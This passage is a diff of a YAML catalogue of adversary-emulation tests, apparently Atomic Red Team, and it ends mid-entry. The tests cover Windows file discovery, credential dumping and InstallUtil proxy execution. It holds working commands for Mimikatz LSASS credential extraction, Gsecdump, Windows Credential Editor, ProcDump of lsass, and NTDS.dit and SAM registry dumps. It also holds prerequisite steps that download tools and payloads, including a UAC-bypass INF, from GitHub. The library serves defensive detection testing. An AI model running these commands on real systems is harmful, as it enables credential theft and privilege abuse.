         name: command_prompt
         elevation_required: false
@@ -16888,7 +17332,7 @@ discovery:
       modified: '2019-08-12T19:52:39.585Z'
       identifier: T1083
     atomic_tests:
-    - name: File and Directory Discovery
+    - name: File and Directory Discovery (cmd.exe)
       description: 'Find or discover files on the file system
 
 '
@@ -16906,7 +17350,7 @@ discovery:
           dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
           dir "%userprofile%\Desktop\*.*" >> %temp%\download
           tree /F >> %temp%\download
-    - name: File and Directory Discovery
+    - name: File and Directory Discovery (PowerShell)
       description: 'Find or discover files on the file system
 
 '
@@ -16941,7 +17385,7 @@ discovery:
           ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
           locate *
           which sh
-    - name: Nix File and Directory Discovery
+    - name: Nix File and Directory Discovery 2
       description: 'Find or discover files on the file system
 
 '
@@ -18437,7 +18881,9 @@ discovery:
       dependencies:
       - description: 'Test requires #{port_file} to exist'
         prereq_command: if (Test-Path "#{port_file}") {exit 0} else {exit 1}
-        get_prereq_command: Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{port_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"
       executor:
         name: powershell
         elevation_required: false
@@ -19457,10 +19903,12 @@ credential-access:
       identifier: T1003
     atomic_tests:
     - name: Powershell Mimikatz
-      description: 'Dumps credentials from memory via Powershell by invoking a remote
-        mimikatz script
-
-'
+      description: "Dumps credentials from memory via Powershell by invoking a remote
+        mimikatz script.\n\nIf Mimikatz runs successfully you will see several usernames
+        and hashes output to the screen.\n\nCommon failures include seeing an \"access
+        denied\" error which results when Anti-Virus blocks execution. \nOr, if you
+        try to run the test without the required administrative privleges you will
+        see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -19476,9 +19924,14 @@ credential-access:
 
 '
     - name: Gsecdump
-      description: 'Dump credentials from memory using Gsecdump
-
-'
+      description: "Dump credentials from memory using Gsecdump.\n\nUpon successful
+        execution, you should see domain\\username's following by two 32 characters
+        hashes.\n\nIf you see output that says \"compat: error: failed to create child
+        process\", execution was likely blocked by Anti-Virus. \nYou will receive
+        only error output if you do not run this test from an elevated context (run
+        as administrator)\n\nIf you see a message saying \"The system cannot find
+        the path specified\", try using the get-prereq_commands to download and install
+        Gsecdump first.\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -19509,17 +19962,20 @@ credential-access:
         elevation_required: true
         command: "#{gsecdump_exe} -a\n"
     - name: Windows Credential Editor
-      description: 'Dump credentials from memory using Windows Credential Editor from
-        https://www.ampliasecurity.com/research/windows-credentials-editor/
-
-'
+      description: "Dump user credentials using Windows Credential Editor (supports
+        Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution,
+        you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf
+        you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf
+        you see a message saying \"wce.exe is not recognized as an internal or external
+        command\", try using the  get-prereq_commands to download and install Windows
+        Credential Editor first.\n"
       supported_platforms:
       - windows
       input_arguments:
         output_file:
           description: Path where resulting data should be placed
           type: Path
-          default: "%temp%\\output.txt"
+          default: "%temp%\\wce-output.txt"
         wce_exe:
           description: Path of Windows Credential Editor executable
           type: Path
@@ -19549,10 +20005,13 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: "#{wce_exe} -o #{output_file}\n"
+        cleanup_command: del "#{output_file}" >nul 2>&1
     - name: Registry dump of SAM, creds, and secrets
       description: |
         Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
         via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+
+        Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
       supported_platforms:
       - windows
       executor:
@@ -19569,7 +20028,11 @@ credential-access:
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
-        ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
+        ProcDump.
+
+        Upon successful execution, you should see a file the following file created C:\Windows\Temp\lsass_dump.dmp.
+
+        If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
       supported_platforms:
       - windows
       input_arguments:
@@ -19620,30 +20083,47 @@ credential-access:
     - name: Offline Credential Theft With Mimikatz
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
-        Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
+        Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
       supported_platforms:
       - windows
       input_arguments:
-        mimikatz_binary_path:
+        mimikatz_exe:
           description: Path of the Mimikatz binary
           type: string
-          default: "$PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe"
+          default: PathToAtomicsFolder\T1003\bin\mimikatz.exe
         input_file:
           description: Path of the Lsass dump
           type: Path
-          default: C:\Windows\Temp\lsass_dump.dmp
+          default: "%tmp%\\lsass.DMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+          New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+      - description: Lsass dump must exist at specified location (#{input_file})
+        prereq_command: 'cmd /c "if not exist #{input_file} (exit /b 1)"'
+        get_prereq_command: Write-Host "Create the lsass dump manually using the steps
+          in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
       executor:
         name: command_prompt
         elevation_required: true
-        command: '#{mimikatz_binary_path} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
+        command: '#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
           full" exit
 
 '
     - name: Dump Active Directory Database with NTDSUtil
       description: |
+        This test is intended to be run on a domain Controller.
+
         The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
         uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
         subsequent domain controllers without the need of network-based replication.
+
+        Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.
       supported_platforms:
       - windows
       input_arguments:
@@ -19664,10 +20144,10 @@ credential-access:
 
 '
     - name: Create Volume Shadow Copy with NTDS.dit
-      description: 'The Active Directory database NTDS.dit may be dumped by copying
-        it from a Volume Shadow Copy.
+      description: |
+        This test is intended to be run on a domain Controller.
 
-'
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
       supported_platforms:
       - windows
       input_arguments:
@@ -19688,11 +20168,12 @@ credential-access:
 
 '
     - name: Copy NTDS.dit from Volume Shadow Copy
-      description: "The Active Directory database NTDS.dit may be dumped by copying
-        it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test
-        \"Create Volume Shadow Copy with NTDS.dit\".\nA successful test also requires
-        the export of the SYSTEM Registry hive. \nThis test must be executed on a
-        Windows Domain Controller.\n"
+      description: "This test is intended to be run on a domain Controller.\n\nThe
+        Active Directory database NTDS.dit may be dumped by copying it from a Volume
+        Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume
+        Shadow Copy with NTDS.dit\".\nA successful test also requires the export of
+        the SYSTEM Registry hive. \nThis test must be executed on a Windows Domain
+        Controller.\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -19750,10 +20231,12 @@ credential-access:
 
 '
     - name: GPP Passwords (Get-GPPPassword)
-      description: 'Look for the encrypted cpassword value within Group Policy Preference
-        files on the Domain Controller.
+      description: |
+        Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
+        This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
+        The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.
 
-'
+        Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".
       supported_platforms:
       - windows
       input_arguments:
@@ -19786,7 +20269,9 @@ credential-access:
           Get-GPPPassword -Verbose
     - name: LSASS read with pypykatz
       description: "Parses secrets hidden in the LSASS process with python. Similar
-        to mimikatz's sekurlsa::\n  \n"
+        to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's
+        to meet the prerequisites for this test.\n\nSuccessful execution of this test
+        will display multiple useranames and passwords/hashes to the screen.\n  \n"
       supported_platforms:
       - windows
       dependency_executor_name: powershell
@@ -20163,6 +20648,13 @@ credential-access:
           description: TLS Server To Test Get Request
           type: Url
           default: https://www.example.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1179x64.dll must exist on disk at specified location (#{file_name})
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/bin/T1179x64.dll" -OutFile "#{file_name}"
       executor:
         name: powershell
         elevation_required: true
@@ -20680,6 +21172,13 @@ credential-access:
           description: Path to DLL to be installed and registered
           type: Path
           default: PathToAtomicsFolder\T1174\src\AtomicPasswordFilter.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: AtomicPasswordFilter.dll must exist on disk at specified location
+          (#{input_dll})
+        prereq_command: 'if (Test-Path #{input_dll}) {exit 0} else {exit 1}'
+        get_prereq_command: Write-Host "You must provide your own password filter
+          dll"
       executor:
         name: powershell
         elevation_required: true
@@ -20757,7 +21256,7 @@ credential-access:
         command: |
           echo "ATOMICREDTEAM" > %windir%\cert.key
           dir c:\ /b /s .key | findstr /e .key
-        cleanup_command: 'del c:\Windows\cert.key
+        cleanup_command: 'del c:\Windows\cert.key >nul 2>&1
 
 '
     - name: Discover Private SSH Keys
@@ -20971,6 +21470,13 @@ execution:
           description: Path to the INF file
           type: path
           default: PathToAtomicsFolder\T1191\src\T1191.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: INF file must exist on disk at specified location (#{inf_file_path})
+        prereq_command: 'if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf" -OutFile "#{inf_file_path}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -20989,6 +21495,13 @@ execution:
           description: Path to the INF file
           type: path
           default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: INF file must exist on disk at specified location (#{inf_file_uac})
+        prereq_command: 'if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191_uacbypass.inf" -OutFile "#{inf_file_uac}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -21127,6 +21640,13 @@ execution:
           description: Local .chm payload
           type: path
           default: PathToAtomicsFolder\T1223\src\T1223.chm
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The payload must exist on disk at specified location (#{local_chm_file})
+        prereq_command: 'if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1223/src/T1223.chm" -OutFile "#{local_chm_file}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -21296,6 +21816,13 @@ execution:
           description: path to cpl file
           type: path
           default: PathToAtomicsFolder\T1196\bin\calc.cpl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Cpl file must exist on disk at specified location (#{cpl_file_path})
+        prereq_command: 'if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{cpl_file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1196/bin/calc.cpl" -OutFile "#{cpl_file_path}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -21465,48 +21992,536 @@ execution:
       - Digital Certificate Validation
       identifier: T1118
     atomic_tests:
-    - name: InstallUtil uninstall method call
+    - name: CheckIfInstallable method call
+      description: 'Executes the CheckIfInstallable class constructor runner instead
+        of executing InstallUtil.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: CheckIfInstallable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $ExpectedOutput = 'Constructor_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallHelper method call
+      description: 'Executes the InstallHelper class constructor runner instead of
+        executing InstallUtil.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: InstallHelper
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil class constructor method call
+      description: 'Executes the installer assembly class constructor.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil Install method call
+      description: 'Executes the Install Method
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_Install_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil Uninstall method call - /U variant
       description: 'Executes the Uninstall Method
 
 '
       supported_platforms:
       - windows
       input_arguments:
-        filename:
-          description: location of the payload
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.dll
-        source:
-          description: location of the source code to compile
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.cs
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
-    - name: InstallUtil GetHelp method call
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_Uninstall_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall'
+        variant
       description: 'Executes the Uninstall Method
 
 '
       supported_platforms:
       - windows
       input_arguments:
-        filename:
-          description: location of the payload
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.dll
-        source:
-          description: location of the source code to compile
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
           type: Path
-          default: PathToAtomicsFolder\T1118\src\T1118.cs
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_Uninstall_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil HelpText method call
+      description: 'Executes the Uninstall Method
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+        assembly_dir:
+          description: directory to drop the compiled installer assembly
+          type: Path
+          default: "$Env:TEMP\\"
+        assembly_filename:
+          description: filename of the compiled installer assembly
+          type: String
+          default: T1118.dll
+        invocation_method:
+          description: the type of InstallUtil invocation variant - Executable, InstallHelper,
+            or CheckIfInstallable
+          type: String
+          default: Executable
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
